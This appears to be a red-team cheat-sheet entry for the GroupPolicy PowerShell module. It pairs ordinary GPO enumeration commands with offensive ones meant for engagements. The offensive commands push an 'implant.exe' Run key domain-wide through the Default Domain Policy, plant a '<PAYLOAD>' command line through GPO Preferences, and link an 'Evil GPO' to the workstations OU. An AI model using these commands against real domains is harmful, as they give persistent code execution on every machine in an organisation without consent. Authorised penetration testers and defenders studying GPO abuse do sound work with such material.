# 03.14 Group Policy Module

> Official Microsoft GroupPolicy PowerShell module — query and modify GPOs.

## Overview

The GroupPolicy PowerShell module is part of RSAT. Get-GPO, Get-GPOReport, Get-GPRegistryValue, Set-GPRegistryValue, Set-GPPrefRegistryValue, New-GPLink, Restore-GPO. Use for blue-team-style GPO enumeration and for surgical GPO modification on engagements where SharpGPOAbuse is too noisy or you need finer control.

## Steps

- **Step 1** - RSAT-installed Windows host.
- **Step 2** - Import-Module GroupPolicy.
- **Step 3** - Query with Get-GPO; modify with Set-GP*.

## Commands

### Import

```powershell
Import-Module GroupPolicy
```

### List all GPOs

```powershell
Get-GPO -All
Get-GPO -All | Select-Object DisplayName,Id,GpoStatus,CreationTime,ModificationTime
```

### Generate XML report of a GPO

```powershell
Get-GPOReport -Name 'Default Domain Policy' -ReportType XML -Path C:\Temp\gpo.xml
Get-GPOReport -All -ReportType HTML -Path C:\Temp\all_gpos.html
```

### Modify GPO registry value (push setting domain-wide)

```powershell
Set-GPRegistryValue -Name 'Default Domain Policy' -Key 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run' -ValueName 'Updater' -Type String -Value 'C:\Windows\Temp\implant.exe'
```

### Add scheduled task via GPO Preferences

```powershell
Set-GPPrefRegistryValue -Name 'Default Domain Policy' -Context Computer -Key 'HKLM\Software\Updater' -ValueName 'Trigger' -Type String -Value 'CmdLine /c <PAYLOAD>'
```

### Link GPO to OU

```powershell
New-GPLink -Name 'Evil GPO' -Target 'OU=Workstations,DC=<DOMAIN>,DC=local'
```
